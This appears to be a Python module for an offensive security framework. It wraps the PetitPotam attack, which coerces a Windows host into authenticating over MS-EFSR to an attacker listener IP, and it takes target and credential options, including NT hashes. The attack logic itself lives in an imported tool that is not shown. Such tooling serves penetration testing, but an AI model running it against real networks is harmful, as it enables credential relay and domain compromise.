import asyncio
import shlex

from tool import Tool
from pathlib import Path
from module import BaseModule

class PetitPotam(BaseModule):
    path = "coercion/petitpotam"
    description = "MS-EFSR abuse (PetitPotam)"
    options = {
        "listen_ip": {"default": "", "description": "Listener (attacker) IP", "required": True},
        "target": {"default": "", "description": "Coercion target (if using Kerberos auth, use FQDN)", "required": True},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": False},
        "username": {"default": "", "description": "Auth: Username", "required": False},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": False},
        #"method": {"default": "EncryptFileSrv", "description": "Coercion method (EncryptFileSrv, DecryptFileSrv, QueryUsersOnFile, QueryRecoveryAgents, RemoveUsersFromFile, AddUsersToFile, FileKeyInfo, DuplicateEncryptionInfoFile, AddUsersToFileEx)", "required": True},
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def _run(self, listen_ip, target, sleep, pane):

        await asyncio.sleep(sleep)
    
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return
        tool.set_output_pane(pane)
        await tool.petitpotam(listen_ip, target)

    async def run(self, sleep=1):
        if not self.validate_options():
            return
        
        await self._run(self.opts.listen_ip, self.opts.target, sleep, self.pane_c)
